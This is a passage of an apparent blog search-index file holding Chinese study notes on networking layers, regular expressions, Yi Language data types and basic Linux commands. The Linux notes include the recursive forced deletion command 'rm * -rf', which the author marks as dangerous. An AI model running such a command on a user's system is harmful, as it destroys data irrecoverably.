2 字节序列(0x7D, 0x5E)。 若信息字段中出现一个 0x7D 的字节, 则将其转变成为 2 字节序列(0x7D, 0x5D)。 若信息字段中出现 ASCII 码的控制字符（即数值小于 0x20 的字符），则在该字符前面要加入一个 0x7D 字节，同时将该字符的编码加以改变。 . 零比特填充 PPP 协议用在 SONET/SDH 链路时，是使用同步传输（一连串的比特连续传送）。这时 PPP 协议采用零比特填充方法来实现透明传输。 在发送端，只要发现有 5 个连续 1，则立即填入一个 0。接收端对帧中的比特流进行扫描。每当发现 5 个连续1时，就把这 5 个连续 1 后的一个 0 删除。 . . 不提供使用序号和确认 的可靠传输 PPP 协议之所以不使用序号和确认机制是出于以下的考虑： 在数据链路层出现差错的概率不大时，使用比较简单的 PPP 协议较为合理。 在因特网环境下，PPP 的信息字段放入的数据是 IP 数据报。数据链路层的可靠传输并不能够保证网络层的传输也是可靠的。 帧检验序列 FCS 字段可保证无差错接受。 . . 3.2.3 PPP协议的工作状态 当用户拨号接入 ISP 时，路由器的调制解调器对拨号做出确认，并建立一条物理连接。 PC 机向路由器发送一系列的 LCP 分组（封装成多个 PPP 帧）。 这些分组及其响应选择一些 PPP 参数，和进行网络层配置，NCP 给新接入的 PC机分配一个临时的 IP 地址，使 PC 机成为因特网上的一个主机。 通信完毕时，NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着，LCP 释放数据链路层连接。最后释放的是物理层的连接。 . . 3.3 使用广播信道的数据链路层(局域网) 3.3.1 局域网的数据链路层 局域网最主要的特点是：网络为一个单位所拥有，且地理范围和站点数目均有限。 局域网具有如下的一些主要优点： 具有广播功能，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。 便于系统的扩展和逐渐地演变，各设备的位置可灵活调整和改变。 提高了系统的可靠性、可用性和残存性。 . . 媒体共享技术 静态划分信道 频分复用 时分复用 波分复用 码分复用 动态媒体接入控制（多点接入） 随机接入 受控接入 ，如多点线路探询(polling)，或轮询。","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"正则表达式","slug":"yyy0002正则表达式","date":"2021-03-29T08:23:07.000Z","updated":"2021-03-29T15:08:59.457Z","comments":true,"path":"2021/03/29/yyy0002正则表达式/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/yyy0002正则表达式/","excerpt":"","text":"正则表达式 点号应用之简单的数据提取 利用点匹配我们想要的数据并提取出来可以匹配任何一个单字符除换行符外 1个点号只能匹配字符,如123456789abcde… .等,必须为半角的如果想要匹配全半数字,字母，或汉字,就必须要2个点号 星号正则的认识与应用 *星号表示之前的元素出现任意次数或0次 比如: 4.*8我们来看一下他是什么意思，星号出现在点号的后面，这代表点号有出现也行，没有出现也行: 打个比方，他可以匹配48、41238、412345678、4012345670123458 问号和加号的认识与应用 连字符和范围描述符的认识与应用 在学习&quot;-&quot;连字符前，我们先来认识一个强大的符号: [ ]， 这个[ ]所括的内容，可以不按顺序进行匹配。[] 范围描述符 范围描述符。如: [a-z]表示从a到z之间的任意一个。 - 连字符 A一般都与&quot;[]”起使用，只有连字符在字符组内部 时，并且出现在两个字符之间时，才能表示字符的范围;如果出现在字符组的开头，则只能表示连字符本身 例如: [0-9]匹配任意0到9的数字 [a-z]匹配所有小写字母 [A-Z]匹配所有大写字母 当然，你可以把它们混在一起写成[a-z0-9]、[0-9a-zA-z]的样 子都可以下面我们举2个例子就明白了 必从一个网页源码中，区分出数字并提取出来 脱字符^和美元符$的认识与应用 排除:[^1-9]匹配除了1到9的数字,其他的都可以匹配 转义符\\的认识与应用 \\转义符作用:把正 则的元字符转换成元字符本身 如果需要匹配的某个字符本身就是元字符(如:.?*+) ，正则表达式将如何处理呢? 比如:我想要检索互联网的主机名，也就是我们说的网址,如: www.23 .com我们的正则语句要怎么写呢? 想的快的会员就会说，我直接就用www.23.com来匹配点号可以匹配任何字符包括点号本身，当然， 这样是可以匹配到。 但是，如果有www123.com www223. com它们同样也会被匹配出来，唯一的解决办法就是把点号用转义符转换成他自身。 字符组简记法 大括号与选择符的认识与应用 子表达式的认识与应用 贪婪和懒惰的匹配 通配符匹配规则： * ：任意数量的字符 ？：任何单个字符 正则 匹配规则： * 前面元素出现0次以上 . 匹配任何单个字符 ? 前面元素出现0次或1次 + 前面元素出现1次以上 ^ 表示开头。 $ 表示结尾。 .* 表示0个以上的任意字符。 [ ] 范围描述符。[a-z]表示从a到z之间的任意一个。 \\w 英文字母和数字。即[0-9 A-Z a-z]。 \\W 非英文字母和数字 \\s 空字符，即[\\t\\n\\r\\f]。 \\S 非空字符。 \\d 数字，即[0-9]。 \\D 非数字。 \\b 词边界字符（在范围描述符外部时） \\B 非词边界字符 \\b 退格符（0x08）（在范围描述符内部时） {m,n} 前面元素最少出现m次,最多出现n次 | 选择 ( ) 群组 其他字符 该字符本身","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"数据类型","slug":"yyy0001数据类型","date":"2021-03-29T07:07:49.000Z","updated":"2022-05-30T16:06:19.269Z","comments":true,"path":"2021/03/29/yyy0001数据类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/yyy0001数据类型/","excerpt":"","text":"数据类型 什么是变量的数据类型呢?实际就是指变量内所存储的数据的类型。 下面我们来讲讲变量内所能存储的基本数据类型。 1.字节型。 可容纳0到255之间的数值。 2.短整数型。 可容纳-32,768到32,767之间的数值，尺寸为2个字节。 3.整数型。 可容纳-2,147 ,483,648到2,147,483,647之间的数值，尺寸为4个字节。 4.长整数型。 可容纳-9,223,372,036,854,775,808到 9,223,372,036,854,775,807之间的数值，尺寸为8个字节。 5.小数型。 可容纳3.4E +/- 38 (7位小数)之间的数值，尺寸为4个字节。 6.双精度小数型。 可容纳1.7E +/- 308 (15位小数)之间的数值，尺寸为8个字节。 7.逻辑型。 值只可能为“真&quot;或“假”，尺寸为2个字节。“真&quot;和“假&quot;为系统预定义常量，其对应的英文常量名称为“true&quot;和false&quot;. 8.日期时间型。 用作记录日期及时间，尺寸为8个字节。 9.文本型。 用作记录一段文本，文本由以字节0结束的一系列字符组成。 10.字节集。 用作记录一段字节型数据。 字节集与字节数组之间可以互相转换，在程序中允许使用字节数组的地方也可以使用字节集，或者相反。字节数组的使用方法，譬如用中括号对(“[]&quot;)加索引数值引用字节成员，使用数组型数值数据进行赋值等等，都可以被字节集所使用。两者之间唯一的不同是字节集可以变长，因此可把字节集看作可变长的字节数组。 11.子程序指针。 用作指向一个子程序，尺寸为4个字节。 在以上的基本数据类型中，字节型、短整数型、整数型、长整数型、小数型、双精度小数型被统称为“数值型”，它们之间可以任意转换。不过编程需要注意转换可能带来的精度丢失。譬如:将整数257转换为字节后的结果为1，这是因为值257超出了字节型数据的最大上限255,从而产生了溢出。查看变量所可以使用的数据类型，在定义变量中双击类型就可以查看所支持的所有数据类型。 创建变量 局部变量 快捷键: ctrl + L 子程序内有效 全局变量 快捷键:ctrl +G 整个程序有效 程序集变量 点击程序集1按下回车键 整个程序集有效 变量可以先使用后声明 易语言规定用[]代表日期类型数据 [年-月-日 时-分-秒] [年:月:日 时:分:秒] [2020-1-1 11-11-22] [2020:1:1 11:11:22] 静态变量和非静态变量的区别 静态变量 经过第一次初始化之后,后面就不用初始化了 子程序结束,变量不释放 非静态变量 每次都会初始化 子程序结束,变量释放","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"介绍Android系统的发展历史和发行版本","slug":"介绍Android系统的发展历史和发行版本","date":"2021-03-28T16:11:26.000Z","updated":"2021-03-28T16:11:53.533Z","comments":true,"path":"2021/03/29/介绍Android系统的发展历史和发行版本/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/介绍Android系统的发展历史和发行版本/","excerpt":"","text":"","categories":[{"name":"Android","slug":"Android","permalink":"https://xiaowuyoucy.github.io/categories/Android/"}],"tags":[]},{"title":"易语言介绍","slug":"易语言介绍","date":"2021-03-28T16:09:38.000Z","updated":"2021-03-29T06:39:47.350Z","comments":true,"path":"2021/03/29/易语言介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/03/29/易语言介绍/","excerpt":"","text":"官方网站 http://www.dywt.com.cn/","categories":[{"name":"易语言","slug":"易语言","permalink":"https://xiaowuyoucy.github.io/categories/易语言/"}],"tags":[]},{"title":"第二章 物理层","slug":"计算机网络原理笔记-第二章-物理层","date":"2021-01-10T08:53:04.000Z","updated":"2021-01-14T07:41:11.865Z","comments":true,"path":"2021/01/10/计算机网络原理笔记-第二章-物理层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/01/10/计算机网络原理笔记-第二章-物理层/","excerpt":"","text":"计算机网络原理 第二章 物理层 2.1 物理层的基本概念 2.2 数据通信的基础知识 相关术语 有关信道的几个基本概念 2.3 物理层下面的传输媒体 2.4 信道复用技术 2.5 数字传输系统 2.6 宽带接入技术 2.1 物理层的基本概念 物理层解决如何在连接各种计算机传输媒体上传输bit流，注意，不是指用什么传输媒体（介质） 物理层主要任务：确定传输媒体接口的一些特性：（为了统一规划，标准化，各个厂商生产一致，可以通用） 机械特性：接口形状 大小 引线数目 网线内有几根线 电气特性：例如规定电压范围 功能特性：例如规定-5V表示0 +5V表示1（电压信号代表数字信号） 过程特性：（规程特性）规定建立连接时各个部件的工作步骤 2.2 数据通信的基础知识 数据通信模型（图） 相关术语 通信的目的是传送消息 数据（data）：运送消息的实体 信号（signal）：数据的电气或电磁表现 –模拟信号：代表消息的参数取值连续（如电压高低电平代表01数据） –数字信号：代表消息的参数取值离散 码元（code）：在使用时间域的波形表示数字信号时，则代表不同 离散数值的基本波形就称为码元 在数字通信中常常用时间间隔相同的符号来表示一个二进制数字，这样的时间间隔内的信号称为二进制码元，而这个间隔被称为码元长度，1码元可以携带n bit的信息量 解释： 如果信号一共用2种可能，那么1码元代表1bit信息（只有高低电平） 如果信号一共用4种可能，那么1码元代表2bit信息，00 01 10 11，码元有四种可能，一码元代表2bit …… 如果信号一共用2的n次方种可能，那么1码元代表nbit信息。 有关信道的几个基本概念 信道一般表示向一个方向传送的信息的媒体。所以咱们说平常的信息线路往往包含一条发送信息的信道和一条接受信息的信道。 单向通信（单工通信）–只能发送或只能接收 例子：电视塔发送电视信号，但是电视无法向电视塔发送信号 双向交替通信（半双工通信）–双方可以收发，但是不能同时发送或同时接收 双向同时通信（全双工通信）–通信的双方可以同时发送和接收消息 例子：打电话 计算机通信大多数是半双工和全双工通信 基带信号（baseband）和带通信号（band pass） 前提：信号是会衰减的，比如人说话，当距离较远之后，声音就会听不到。 基带信号（baseband）：来自信息源的信号。 带通信号（band pass）：把基带信息经过载波调制后的信号（载波调制就是把信号的频率搬到较高的频段，以便传输） 因此，如果传输距离短，信息衰减可以接受，那就直接使用基带信号，如果距离长，信号衰减大，那就得通过调制将基带信号转换为带通信号，以减小衰减，接收方收到后再进行解调，分析成基带信号进行解读。 几种基本调制方法： 调幅 调频 调相 具体见图： （数字信号的）编码格式： 单极性不归零码 双极性不归零码 单极性归零码 双极性归零码 归零码：一次信号结尾始终为0电压 不归零码：一次信号结尾不需要归零 单极性：只有正向和0电压 双极性：有正负电压 曼彻斯特编码：低电平跳高电平代表0 高电平条低电平代表1，可以代表没有数据传输（用电平变化代表数据传输） 差分曼彻斯特编码：0和1没有固定高低电平，后面的信号是几取决于前面的信号 信道极限容量：信号波形在实际信道传输时，会受到带宽受限、噪声、干扰等引起失真。 奈氏准则：在理想条件下，为了避免码间串扰（码元太短，无法识别高低电平），码元传输速率是有上限的（上一章带宽可以无限增加吗例子） 信噪比：带宽受阻且有高斯白噪声干扰的信道的情况下，信道的极限无差错信息传输速率信道的极限信息传输速率C的计算公式：（香农公式） C = Wlog2(1+S/N) b/s (log2是log以2为底) W：信道带宽（单位Hz） S：信道内所传信号的平均功率 N：信道内部高斯噪声功率 香农公式的结论： 1信道的带宽或信道的信噪比(S/N)越大，信息极限传输速率越高，若W或S/N没有上限，则C没有上限（实际不可能） 2只要信息传输速率低于信道极限信息传输速率，则一定可以找到方法确保数据的无差错传输 实际上信道所能达到的速率比香农公式计算出的低不少 例子：每分钟说200字，外面有噪声，降低说话速度，来确保收听者听到 又例如：无线网的衰减：路由器和计算机在相同房间，计算机速率150M，计算机搬到隔壁，速率只剩下100M，因为隔了一道墙，要确保可靠传输就要降低速率，墙可以理解为噪声。 2.3 物理层下面的传输媒体 导向传输媒体：电磁波沿着固体介质传播 双绞线 –屏蔽双绞线STP（铜线绞在一起，避免电流相互作用，减少干扰） –无屏蔽双绞线UTP（比上面多了一层绝缘层，避免外界干扰） 同轴电缆 （结构和有线电视的电线一样） –50欧姆同轴电缆用于数字传输，多用于基带传输，也叫基带同轴电缆 –75欧姆同轴电缆用于模拟传输，即宽带同轴电缆 光缆 单模光纤 多模光纤 非导向传输媒体（无线传输）：无线传输所使用的频段很广。 短波通信主要是靠电离层的反射，但短波信道的通信质量较差。 微波在空间主要是直线传播。 地面微波接力通信 卫星通信 2.4 信道复用技术 目的：多用户同时传输，不会相互影响。提高信道利用率 频分复用 FDM(Frequency Division Multiplexing) 用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。 频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）。 解释：特定的用户使用特定的频率波段，传输时采用不同频率的波段进行调制和解调，已达到区分其他数据的目的 时分复用TDM(Time Division Multiplexing) 时分复用则是将时间划分为一段段等长的时分复用帧（TDM 帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。 每一个用户所占用的时隙是周期性地出现（其周期就是 TDM 帧的长度）。 TDM 信号也称为等时(isochronous)信号。 时分复用的所有用户是在不同的时间占用同样的频带宽度。 时分复用可能会造成线路资源的浪费 ： 使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的。 统计时分复用 STDM(Statistic TDM) 与时分复用类似，只不过每次发送时标记是哪个用户发出的，解析时按标记解析。可以避免线路资源的浪费 波分复用 WDM(Wavelength Division Multiplexing) 波分复用就是光的频分复用。 码分复用 CDM(Code Division Multiplexing) 常用的名词是码分多址 CDMA (Code Division Multiple Access)。 各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。 每一个比特时间划分为 m 个短的间隔，称为码片(chip)。 2.5 数字传输系统 脉码调制 PCM 体制：最初是为了在电话局之间的中继线上传送多路的电话。 由于历史上的原因，PCM 有两个互不兼容的国际标准，即北美的 24 路 PCM（简称为 T1）和欧洲的 30 路 PCM（简称为 E1）。我国采用的是欧洲的 E1 标准。 E1 的速率是 2.048 Mb/s，而 T1 的速率是 1.544 Mb/s。当需要有更高的数据率时，可采用复用的方法。 E1取样8000次/s 每个码元代表8位bit E1 采用时分复用技术 32路同时传输 8800032 = 2.048Mb/s T1只有24路同时传播，且有控制信号 8800024+8K=1.544Mb/s(8K表示控制信号) 2.6 宽带接入技术 ADSL (Asymmetric Digital Subscriber Line)：非对称数字用户线（就是通过电话线上网） 用数字技术对现有的模拟电话用户线进行改造，使它能够承载宽带业务。把 0~4 kHz 低端频谱留给传统电话使用，而把原来没有被利用的高端频谱留给用户上网使用。 ADSL实现原理采用DMT技术 DMT 调制技术采用频分复用的方法，把 40 kHz 以上一直到 1.1 MHz 的高端频谱划分为许多的子信道，其中 25 个子信道用于上行信道，而 249 个子信道用于下行信道。每个子信道占据 4 kHz 带宽（严格讲是 4.3125 kHz），并使用不同的载波（即不同的音调）进行数字调制。这种做法相当于在一对用户线上使用许多小的调制解调器并行地传送数据。 ADSL上网图解： 光纤同轴混合网 HFC (Hybrid Fiber Coax)（就是利用有线电视线路上网） HFC 网是在目前覆盖面很广的有线电视网 CATV 的基础上开发的一种居民宽带接入网。HFC 网除可传送 CATV 外，还提供电话、数据和其他宽带交互型业务。现有的 CATV 网是树形拓扑结构的同轴电缆网络，它采用模拟技术的频分复用对电视节目进行单向传输。而 HFC 网则需要对 CATV 网进行改造。 HFC 的主要特点 HFC网的主干线路采用光纤 HFC 网将原 CATV 网中的同轴电缆主干部分改换为光纤，并使用模拟光纤技术。 在模拟光纤中采用光的振幅调制 AM，这比使用数字光纤更为经济。 模拟光纤从头端连接到光纤结点(fiber node)，即光分配结点 ODN (Optical Distribution Node)。在光纤结点光信号被转换为电信号。在光纤结点以下就是同轴电缆 HFC结构示意图","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"第一章 概述","slug":"计算机网络原理笔记-第一章-概述","date":"2021-01-10T08:15:21.000Z","updated":"2021-01-13T10:12:33.989Z","comments":true,"path":"2021/01/10/计算机网络原理笔记-第一章-概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/01/10/计算机网络原理笔记-第一章-概述/","excerpt":"","text":"第一章 概述 计算机网络基础（韩立刚视频笔记）第一章 概述 第一章（概述） 局域网 广域网 OSI参考模型 OSI架构图 各层间的数据传输 网络排错 OSI网络参考模型和网络安全的例子 计算机网络性能指标 第一章（概述） 局域网 覆盖范围小，自己单位维护，带宽固定（由硬件决定） 100米 带宽小 多台计算机连接到接入层交换机 多台接入层交换机连接到汇聚层交换机 每一层都是一个星型结构 接入层交换机：接入口多 汇聚层交换机：连接各个接入层交换机，端口带宽高 广域网 距离远 花钱买服务 花钱租带宽 ISP（Internet Server Provider）网络服务提供商 自己的机房 对网民提供Internet服务 运营的网站放在运营商服务器机房 运营商直之间只有一条线路连接，所以这条线路会成为通信速率瓶颈，也是为什么我们跨运营商访问网站比较慢的原因 物理地址的作用：数据传输时记录当前物理地址和下次的传输物理地址 IP地址的作用：记录当前IP地址和目标IP地址 OSI参考模型 应用层 能产生流量的程序 表示层 加密 压缩等处理 传输格式（二进制 ASCII码）乱码是表示层问题（开发者处理） 会话层 可以查木马 netstat -n查看链接状态 netstat -nb 查看连接由谁创建 传输层 可靠传输 流量控制 不可靠传输 网络层 选择最佳路径 规划IP地址 数据链路层 标记帧的开始和结束 透明传输 差错校验 交换机速度 物理层 网络设备接口标准 电器（气？）标准 如何在物理链路进行更快的传输（电压 接口数量 接口类型 通信介质：光纤 网线 双绞线） 分层的好处：7层相互独立，某一层变化不会影响其他层（相当于软件开发的耦合性小的意思） 比如在应用程序写入服务器的IP地址是不符合分层的思想的，万一服务器的IP地址修改 应用程序就挂了（IP地址是网络层的内容，应用程序属于应用层） 各层关系：低层向高层提供服务 OSI架构图 各层间的数据传输 数据封装 （途中的五层架构，就是OSI架构图右侧的五层架构） 网络排错 从底层向上排除 1.物理层故障：网络连接状态 查看发送和接收数据包 2.数据链路层故障：MAC地址冲突 ADSL欠费 网速无法协商 计算机连接到错误的VLAN 3.网络层故障：配置了错误的IP 子网掩码 网关，路由器没有配置可达目标的路由 4.应用层故障：（上四层都在这里说）应用程序配置错误（如如浏览器配置了错误的代理） OSI网络参考模型和网络安全的例子 1.物理层安全 一栋大厦是保险公司的，建造时布好网线，使用时10层租给了其他公司，其他公司通过原先布好的网线就可以访问保险公司网络。（别人应该无法私自连接到你的网络，租售10层时 应将网线断开服务器，或配置将网络断开） 2.数据链路层安全 上网时 ADSL 上网账号密码 VLAN划分 交换机绑定固定MAC地址 3.网络层安全 路由器上使用ACL控制数据包流量（指定IP才传输） 防火墙设置 4.应用层安全 开发的应用程序没有漏洞（比如没有SQL注入漏洞等等） 计算机网络性能指标 1.速率 连接在计算机网络上的主机在数字信道上传送数据位数的速率（data rate，bit rate）单位为b/s,kb/s,Mb/s,Gb/s 这就是我们常说的“我家装的100M的带宽”，不过，有些网站测速显示的速率是按字节来表示的，即需要拿100M/8得到网站显示数据 还有交换机的带宽为100M，100M其实是100Mb/s 2.带宽 数据通信中，数字信道所能传输的最高速率，单位为b/s,kb/s,Mb/s,Gb/s 注意，这也是一个速率，只不过是最大速率，和上面的理解几乎一样，多数情况受硬件限制 3.吞吐量 单位时间内通过某个网络数据量（有可能是几条数据链路流量和） 4.时延 也就是我们平时玩游戏说的延时 时延包括 发送时延 传播时延 处理时延 排队时延 发送时延 = 数据块长度（bit）/信道带宽（bit/s）=N s 加带宽是减少发送时延 传播速度由介质介质决定，介质固定，传播速度固定 带宽可以无限增加吗？ 不可以：数据块长度固定，增加带宽意味着发送时间变短，同时数据块在信道中的长度也变短了（波形长度 = 发送时间 * 传播速度），之前说过传播速度由介质决定，一般固定，那么发送时间越短，波形越短，短到一定程度，接收方就无法识别高低电平了 铜线和光纤的对比： 铜线的传播速率其实和光纤的速率接近，那为什么使用光纤呢？因为光纤支持更高的发送速率，光纤使用光信号，即使数据很短，也能解析出高低电平。而铜线使用电信号，波形太短，无法识别高低电平。 5.时延带宽积=传播时延*带宽 6.往返时间（RTT Round-Trip Time） ping出的时间就是往返时间 &gt;2000ms请求超时 7.利用率 最形象的例子是汽车和公路。以汽车类比数据块，以高速公路类比网络光纤。当汽车较少时，利用率较低，但汽车开的很快，延时较低。如果遇到节假日，高速公路塞满了汽车，公路利用率高了，同时延时也高了，因为车已经开不快了，堵车啊。。。 网络模式: 单工模式：只能发或收 电视台 广播 半双工模式: 可以发和收，但不能同时进行 对讲机 全双工模式: 可以同时发和收 互联网 电话 无线网的带宽 由网络强度决定 集线器 物理层 交换机 物理层 数据链路层 路由器 物理层 数据链路层 网络层","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"linux1-2","slug":"linux001-1-2","date":"2020-11-18T09:24:59.000Z","updated":"2020-11-18T16:29:51.407Z","comments":true,"path":"2020/11/18/linux001-1-2/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/11/18/linux001-1-2/","excerpt":"","text":"操作系统的作用: 使计算机系统易于使用 有效管理系统资源 方便用户开发、测试和引进新功能 向下封装硬件，向上提供操作接口 linux分为内核版本和发行版本 内核源码网站：www.kernel.org 发行版本就是给系统披上了UI 文件系统: 采用 “路径” + “文件名” linux 采用 ‘’/&quot; 且没有盘符 路径分为: 绝对路径 相对路径 ./表示当前目录 ../表示上一级目录 linux目录结构 / 根目录 /home 家目录 /bin 放工具(可执行文件) /lib 库文件 /usr/include 头文件 文件权限 文件分类 普通文件 - 目录文件 d 设备文件 c字符设备 b块设备 管道文件 链接文件 文件类型 文件所有者 用户组 其他人 - rwx rwx rwx -rwxrwxrwx 查看用户组信息 1cat /ect/gruop 查看用户信息 1cat /ect/passwd 用户名: x : 用户id : 组id 文件目录的x权限代表可进入权限 一般情况下linux/unix只允许文件所有者或超级用户(root)改变文件权限 命令 [-可选参数1] [-可选参数n] []是可选参数 查命令 使用–hellp 查手册 用man命令 1man [选项] 命令名 按q退出 enter下一行 空格下一屏 h列出所有功能键 /字符串 搜索所有该字符串 可以使用方向键操控 以章节方式分类 1代表命令 2代表系统调用 3代表库调用 1man 3 printf //查询printf函数使用说明 按tab键可以补全命令 方向键可以查使用过的命令 history 命令 列出历史命令(连续重复的命令只列举一次) ls 遍历当前目录 ls [-选项] -a 遍历所有子目录与文件 -l 详细显示信息 -h 以人性化方式显示文件大小 使用方式 1234ls -ahlls -als -lll #等价于 ls -l 一个文件夹默认有两个目录,一个是.另一个是.. 分别代表当前目录和上一级目录。 文件类型 权限 硬连接数目 文件所有者 用户组 文件大小 创建日期 文件名/目录 如果是文件夹,硬链接数目代表其下有多少子目录 touch 创建文件 123touch 文件名touch abctouch 文件名1 文件名2 文件名3...文件名n 如果文件存在则修改日期时间为当下时间,否则则创建新文件 ? 代表任意一个字符 [abc] 匹配a、b、c中任意一个字符 [a~z] 匹配a~z中任意一个字符 \\ 转义字符 1234ls ?.cls a.?ls [a~d]*ls [abc].? 输出重定向命令: &gt; 将命令执行结果重定向到一个文件上 1234ls &gt; text.txt #如果文件不存在,则创建.存在则覆盖ls &gt;&gt; a.txt #如果文件不存在,则创建.存在则追加内容,不覆盖set -C #禁止覆盖set +C #解除禁止覆盖 分屏显示:more 12more 文件名more abc 按q退出 空格下一页 h帮助 管道:| 一个命令的输出可以通过管道做为另一个命令输入 输出|输入 123ls | grep std #从ls中搜索std字符ls | more 从切换工作目录 cd Linux所有的目录或文件名大小写敏感 12345678910#切换到当前用户的主目录(/home/用户目录)cd ~ #当前目录cd . #上一级目录cd ..#上一次进入的目录cd -cd 相对路径和绝对路径cd ~/share #等价于cd /home/用户名/share 查看当前路径 pwd 清屏 clear 1clear ctrl+l也可以 创建文件夹 mkdir 1234mkdir 文件名mkdir 123 #创建一个123的文件夹mkdir /home/yc/aaa #指定路径创建一个aa文件夹mkdir -p /home/yc/a/b/c #递归创建 创建者需要有当前文件夹写的权限 删除文件夹 rmdir 12rmdir 文件夹名rmdir aaa 文件夹必须是空的才可以删除 rm 可以删除非空文件夹或文件 -f不提示 -r删除文件夹 -i交互式删除 1234rm 文件rm -r 文件夹rm * -rf #危险操作rm 文件1 文件2 文件3...文件n 建立链接文件 ln 硬链接: 给某个文件拷贝一份,这两个文件独立存在 改变其中一个,另一个也会改变 删除某个硬链接,不会影响另一个文件 只能链接普通文件,不能链接目录 12ln 源文件 链接文件ln 1.txt a.txt #a.txt是硬链接文件 软链接: 类似windows的快捷方式 如果源文件删除,软连接文件没有意义 12ln -s 源文件 链接文件ln -s aaa bbb 和windows快捷方式的区别: 假设有一个软连接目录是aaa,源文件是b,进入aaa路径会显示xx/aaa而不是xx/b,aaa实际上是b的别名,实际进入的是b目录 软链接文件的大小是固定的 gedit 图形化文本编辑 1gedit 文件名 文件存在就打开,不存在就创建一个 查看或合并文本内容 cat 1234cat 文件名cat 文件名1...文件名ncat 文件名1 文件名2 文件名n &gt;&gt; 文件名x1 #追加合并文本内容cat 文件名1 文件名2 文件名n &gt; 文件名x1 #覆盖合并文本内容 文本搜索 grep grep [-选项] '字符串' 文件名 字符串最好用双引号括起来 -v求反 -n显示行号 -i不区分大小写 12grep \"sss\" 1.txtgrep aaa 1.txt -n 正则表达式 ^a代表以a开头 ke$以ke结尾 [1~9]1~9中任意一个 [1~9]aaa[1~9]aaa是固定字符 .a.点代表任意一个字符,a是固定字符 ?和*失效 1ls | grep ^a 查找文件 find ​ find 路径 -name 文件名 find 路径 -size 文件大小 find 路径 -perm 0777 12345678find ./ -size 2M #搜索等于2M的文件find ./ -size +2M #搜索大于2M的文件find ./ -size -2M #搜索小于2M的文件find ./ -size +4k -size -5M #搜索大于4k小于5M的文件find 路径 -perm 0777 #搜索777权限的文件find ./ -name abcfind ./ -name \"*.ssh\"find ./ -name \"[a-z]*\" 拷贝文件 cp cp 源文件或目录 文件名 [-选项] -a保持文件原有属性 -f不提醒 -i交互式复制 -r递归复制目录 -v显示进度 12cp ./a /b -rcp ./1.txt ./a/b 移动文件 mv 用来移动或重命名文件或目录 -f 不提示 -i 交互式移动 -v显示进度 123mv ./a.txt ./b mv ./a.txt ./b.txt #重命名mv ./a / 获取文件类型 file file 文件名 executable 可执行文件 ASCII text 文本文件 编译文件 gcc 源文件 -o 文件名 运行程序 直接输入路径+文件名 1./a.exe 归档管理 tar 打包和解包但不压缩 tar [参数] 打包文件名 源文件 -可以不写 打包 1234tar -cvf 打包名称.tar 源文件c 创建包 v 进度 f 后面是打包名,f放最后tar -cvf aaa.tar * 解包 12345tar -xvf 包名tar -xvf 包名 -C 路径指定路径要加大写C,x代表解包 tar -xvf aaa.tar gzip压缩和解压 1gzip xxx.tar #自动生成一个xxx.tar.gz压缩包 -r代表压缩,一般省略不写 -d代表解压 12gzip -r xxx.tar xxx.tar.gz加了-r xxx.tar.gz要自己写 解压 1gzip -d xxx.tar.gz bzip2 解压/压缩 12bzip2 xxx.tar #压缩bzip2 -d xxx.tar.bz2 #解压 打包压缩 指定路径要加 -C gzip 1tar -czvf xxx.tar.gz *.* bzip2 1tar -cjvf xxx.tar.bz2 *.* 1tar -cjvf xxx.tar.bz2 -C ./my/*.* 解压解包 gzip 1tar -xzvf xxx.tar.gz bzip2 1tar -xjvf xxx.tar.bz2 1tar -xjvf xxx.tar.bz2 -C ./my/ 文件压缩和解压 zip unzip 压缩 zip 12zip -r 压缩文件名-r是必须要加的 解压 unzip 12unzip -d 压缩包名unzip -d ./text.zip 查看命令所在目录 which 12which 命令名which ls who查看最近登录的用户 1who w 查看最近登录的用户,显示ip 1w exit 退出当前用户 1exit 如果是图像界面终端,退出当前终端 如果是使用ssh远程登录,退出登录用户 如果是切换后的登录用户,退出则返回上一个登录账户. su 切换用户 123456su #切换到root用户su root #切换root用户su - #切换root用户,同时切换到/root目录su - root #切换root用户,同时切换到/root目录 -两边都有空格su 普通用户su - 普通用户 sudo 运行普通用户执行一些或全部的root命令的一个工具,减少了root用户的登录和管理时间,提高安全性 需要root权限 添加删除组账号:groupadd groupdel groupadd 新建组账号 groupdel删除组账号 如果有用户属于组了,就不能删组了,把用户移出该组才可以删 groupadd 组名 groupdel组名 12groupadd abcgroupdel abc 修改用户所在组 usermod usermod -g 用户组 用户名 1usermod -g root abc 查看用户组信息 cat /etc/group 查看用户信息 cat /etc/passwd yxc19980620c:x:1000:0:yc:/home/yxc19980620c:/bin/bash 1000代表用户id 0代表用户组id 添加用户 useradd或adduser 添加用户时需要在/home目录下添加一个和新建用户同名的文件夹 useradd和adduser功能完全一样 useradd -d 用户文件夹 用户名 -m useradd -d /home/abc abc -m 12useradd -d 用户文件夹 用户名 -m useradd -d /home/abc abc -m -d代表指定用户文件夹 -m代表如果用户文件夹不存在则新建一个用户文件夹 新建用户并指定用户组 useradd -d 用户文件夹 用户名 -g 用户组 -m 1useradd -d 